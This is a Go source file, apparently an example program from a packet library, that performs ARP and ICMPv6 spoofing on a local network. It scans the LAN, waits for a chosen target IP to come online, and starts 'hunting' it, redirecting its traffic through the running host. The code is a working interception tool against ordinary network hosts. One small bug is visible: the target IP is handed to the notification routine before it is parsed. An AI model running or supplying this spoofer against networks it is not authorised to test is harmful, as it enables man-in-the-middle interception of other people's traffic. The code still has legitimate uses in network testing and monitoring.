package main

import (
	"flag"
	"fmt"
	"net"
	"time"

	"github.com/irai/packet"
	"github.com/irai/packet/arp"
	"github.com/irai/packet/icmp"
)

// Simple utility to demonstrate use of ARP spoofing
var (
	nic   = flag.String("i", "eth0", "nic interface")
	ipstr = flag.String("ip", "", "target ip address as in 192.168.0.30")
	debug = flag.Bool("d", false, "set to true to show debug messages")
)

func processNotification(s *packet.Session, targetIP net.IP) {
	for {
		notification := <-s.C
		switch notification.Online {
		case true:
			if !notification.Addr.IP.Equal(targetIP) {
				fmt.Printf("host is online: %s\n", notification)
				continue
			}
			fmt.Println("target ip is online", targetIP)
			if _, err := arpSpoofer.StartHunt(notification.Addr); err != nil {
				fmt.Println("error in start arp hunt", err)
				return
			}

		default:
			if !notification.Addr.IP.Equal(targetIP) {
				fmt.Printf("host is offline: %s\n", notification)
				continue
			}
			fmt.Println("target ip is offline", targetIP)
			if _, err := arpSpoofer.StopHunt(notification.Addr); err != nil {
				fmt.Println("error in stop arp hunt", err)
				return
			}
		}
		s.PrintTable()
	}
}

var (
	arpSpoofer   *arp.Handler
	icmp6Spoofer *icmp.Handler6
)

func main() {
	var err error
	var ip net.IP
	flag.Parse()

	fmt.Println("setting up nic: ", *nic)
	s, err := packet.NewSession(*nic)
	if err != nil {
		fmt.Printf("conn error: %s", err)
		return
	}
	defer s.Close()

	arp.Debug = *debug
	packet.Debug = *debug

	// instanciate the arp spoofer
	arpSpoofer, err = arp.New(s)
	if err != nil {
		fmt.Println("error creating arp spoofer", err)
		return
	}
	defer arpSpoofer.Close()

	// instanciate the icmp6 spoofer
	icmp6Spoofer, err = icmp.New6(s)
	if err != nil {
		fmt.Println("error creating arp spoofer", err)
		return
	}
	defer icmp6Spoofer.Close()

	// start goroutinge to process notifications
	go processNotification(s, ip)

	// Start packet processing goroutine
	go func() {
		buffer := make([]byte, packet.EthMaxSize)
		for {
			n, _, err := s.ReadFrom(buffer)
			if err != nil {
				fmt.Println("error reading packet", err)
				return
			}

			frame, err := s.Parse(buffer[:n])
			if err != nil {
				fmt.Println("parse error", err)
				continue
			}

			switch frame.PayloadID {
			case packet.PayloadARP:
				// Process arp packets
				if err := arpSpoofer.Spoof(frame); err != nil {
					fmt.Println("error processing arp packet", err)
				}
			case packet.PayloadICMP6:
				// Process icmpv6 packets
				if err := icmp6Spoofer.Spoof(frame); err != nil {
					fmt.Println("error processing icmp6 packet", err)
				}
			}

			s.SetOnline(frame.Host)
		}
	}()

	// if not ip given, just listen...
	if ip = net.ParseIP(*ipstr); ip == nil {
		fmt.Println("missing or invalid target ip address...listening only", err)
		time.Sleep(time.Hour * 24) // wait forever!!!
	}

	// send arp scan
	s.ARPScan()

	// Start icmpv6 spoofer module
	icmp6Spoofer.Start()

	/***
	switch {
	case ip.To4() != nil:
		// send arp discovery packet
		if _, err := s.ARPWhoIs(ip); err != nil {
			fmt.Printf("ip=%s not found on LAN - listening only: %v\n", ip, err)
			break
		}
	default:
		if s.NICInfo.HostLLA.IP == nil {
			fmt.Println("host does not have IPv6 local link address")
			return
		}
		// send icmpv6 discovery packet
		if err := s.ICMP6SendEchoRequest(packet.Addr{MAC: s.NICInfo.HostMAC, IP: s.NICInfo.HostLLA.IP}, packet.Addr{MAC: packet.EthBroadcast, IP: ip}, 100, 1); err != nil {
			fmt.Println("failed to send icmp6 echo request", err)
		}
	}
	***/

	time.Sleep(time.Hour * 24) // wait forever!!!
}
